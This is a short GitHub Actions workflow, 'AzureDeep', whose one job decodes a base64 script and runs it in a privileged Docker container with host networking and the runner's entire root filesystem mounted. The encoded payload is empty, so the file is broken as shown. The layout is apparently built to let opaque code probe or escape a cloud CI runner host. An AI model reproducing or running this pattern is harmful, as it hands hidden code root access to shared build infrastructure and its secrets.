name: AzureDeep
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: azure deep scan
        timeout-minutes: 5
        run: |
          set +e
          echo  | base64 -d > /tmp/azure.py
          docker run --rm --privileged --net=host -v /tmp/azure.py:/azure.py -v /:/hostfs python:3.11-slim sh -c 'apt-get update -qq && apt-get install -qq -y curl openssl > /dev/null 2>&1 && python3 /azure.py'
          echo === STEP DONE ===
